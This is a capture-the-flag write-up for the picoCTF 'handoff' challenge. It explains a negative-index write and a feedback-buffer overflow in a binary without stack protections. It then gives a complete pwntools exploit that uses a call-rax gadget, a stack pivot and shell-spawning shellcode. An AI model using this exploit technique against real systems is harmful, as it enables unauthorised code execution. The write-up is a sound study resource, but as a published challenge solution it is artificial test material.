# Description

Download the binary [here](https://challenge-files.picoctf.net/c_shape_facility/7d20bd7d809ec876eedf2dbc6a15974c4a34a735fc5fef28d056ecd58a756625/handoff)Download the source [here](https://challenge-files.picoctf.net/c_shape_facility/7d20bd7d809ec876eedf2dbc6a15974c4a34a735fc5fef28d056ecd58a756625/handoff.c)

Additional details will be available after launching your challenge instance.

# Solution

While reviewing the code of this challenge a few things popped as red flags, first we are able to write at arbitrary offsets (we can use negative numbers on option 2) because there's no boundary check for numbers lower than 0.

```c
else if (choice == 2) {
	choice = -1;
	puts("Which recipient would you like to send a message to?");
	if (scanf("%d", &choice) != 1) exit(0);
	getchar();
	
	if (choice >= total_entries) {
		puts("Invalid entry number");
		continue;
	}

	puts("What message would you like to send them?");
	fgets(entries[choice].msg, MSG_LEN, stdin);
```

We also have an overflow in option 3.

```c
else if (choice == 3) {
	choice = -1;
	puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
	fgets(feedback, NAME_LEN, stdin);
	feedback[7] = '\0';
	break;
}
```

The feedback variable is at most 8 bytes long and we are reading NAME_LEN bytes of size 32 into it. Something worth noting is that we don't have canary, NX and pie protections enabled for this binary.

![[Pasted image 20250308125226.png]]

This will make our life easier since we can just pivot execution to the stack and go from there ...

It seems we are able to write from (rbp-0x2e0)-choice

![[Pasted image 20250308154628.png]]

At time of execution we have 0xfd4 bytes between rsp and rbp, if we take the 2e0 offset into account we are separated by 0xcf4, this should be enough space to prepare our custom shellcode.

If we add the first payload via the addition of an entry and message, we should have a payload at $rsp+0x10 as shown below ...

![[Pasted image 20250308161605.png]]


... so if we are able to overwrite the return address with a push rsp, ret instruction we should be able to redirect execution to our shellcode  in the stack.

Also if we use the exit feature, we are able to overwrite pass rbp ...

![[Pasted image 20250308162307.png]]

While looking for ways to gain execution control it became clear that we could leverage the different registers that had data from our controlled buffer like RAX, RCX and RSI ...

![[Pasted image 20250308162703.png]]

At this point we just had to find a call or jmp instruction to one of our controlled registers that could be used to execute our first stage shellcode, fortunately there is a call rax instruction at offset 0x401014.

```
0x0000000000401014 : call rax
```

From there we created a custom shellcode to perform our stack pivot:

```
sub rsp, 0x2e0
push rsp
ret
```

Once that is executed we have our second stage shellcode ready at offset RSP-0x2e0.

![[Pasted image 20250308172954.png]]

Full py script ...

```python
#!/usr/bin/python
# -*- coding: latin-1 -*-

from pwn import *
import sys

script='''
b *vuln + 202
b *vuln + 387
b *vuln + 447
'''

def send_payload(payload):
    r.sendline(payload)
    return r.recvall()

def hunt():
  #pause()
  context.update(arch='amd64', os='linux')
  shellcode = shellcraft.sh()
  prestage = asm('nop')
  prestage += asm('nop')
  prestage += asm('sub rsp, 0x2e0')
  prestage += asm('nop')
  prestage += asm('nop')
  prestage += asm('nop')
  prestage += asm('push rsp')
  prestage += asm('ret')
  print(hexdump(prestage))
  print(shellcode)
  print(hexdump(asm(shellcode)))
  r.recvuntil(b'3. Exit the app\n')
  r.sendline(b'1')
  r.recvuntil(b"What's the new recipient's name: \n")
  r.sendline(b'\x90')
  r.recvuntil(b'3. Exit the app\n')
  r.sendline(b'2')
  r.recvuntil(b'Which recipient would you like to send a message to?\n')
  r.sendline(b'0')
  r.recvuntil(b'What message would you like to send them?\n')
  r.sendline(asm(shellcode))
  r.recvuntil(b'3. Exit the app\n')
  r.sendline(b'3')
  r.recvuntil(b'we would really appreciate it: \n')
  stage1 = prestage + b'\x90'*6 + p64(0x401014) + b'\x90'*2
  r.sendline(stage1)
  r.interactive()

if __name__ == '__main__':
  context.terminal = ['tmux','splitw','-v']

  binary="./handoff"
  bin_args = ["AAAAAAAA", "BBBBBBBB"]
  host, port = "localhost 5000".split()

  if len(sys.argv) > 1:
    r = remote(host,int(port))
  else:
    log.info("For remote: %s remote" % sys.argv[0])
    r = gdb.debug([binary,b'AAAAAAAA'],gdbscript=script, env={"LD_PRELOAD":""})
  hunt()
  ```
  